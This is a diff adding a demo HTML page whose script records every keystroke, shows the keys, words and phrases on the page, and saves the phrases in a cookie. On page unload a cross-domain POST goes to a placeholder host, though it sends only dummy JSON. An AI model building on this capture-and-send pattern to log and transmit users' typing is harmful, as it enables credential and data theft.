@@ -1,0 +1,55 @@
+<head>
+	<script src="https://code.jquery.com/jquery-latest.js"></script>
+		
+	<script type="text/javascript">
+	var keyList = "";
+
+	function displayunicode(e)
+	{
+		var unicode=e.keyCode? e.keyCode : e.charCode;
+		var key = e.key;
+		keyList = keyList + key;
+		document.getElementById("output1").innerHTML = keyList;
+		
+		var words = keyList.split(" ");
+		document.getElementById("output2").innerHTML = words;
+		
+		var phrases = keyList.split(".");
+		document.getElementById("output3").innerHTML = phrases;
+		
+		console.log("|key list: " + keyList);
+		console.log("|words:    " + words);
+		console.log("|phrases:  " + phrases);
+		
+		// Save in cookie
+		document.cookie = "phrases=" + phrases;
+	}
+
+	window.onbeforeunload = function(event)
+	{
+		$.ajax({
+			type: 'POST',
+			url: 'https://url.com',
+			crossDomain: true,
+			data: '{"some":"json"}',
+			dataType: 'json',
+			success: function(responseData, textStatus, jqXHR) {
+				var value = responseData.someKey;
+			},
+			error: function (responseData, textStatus, errorThrown) {
+				alert('POST failed.');
+			}
+		});
+	};
+	</script>
+</head>
+<body onkeydown="displayunicode(event)">
+	<p>Raw output</p>
+	<a id="output1"></a>
+	<br/>
+	<p>Words output</p>
+	<a id="output2"></a>
+	<br/>
+	<p>Phrases output</p>
+	<a id="output3"></a>
+</body>
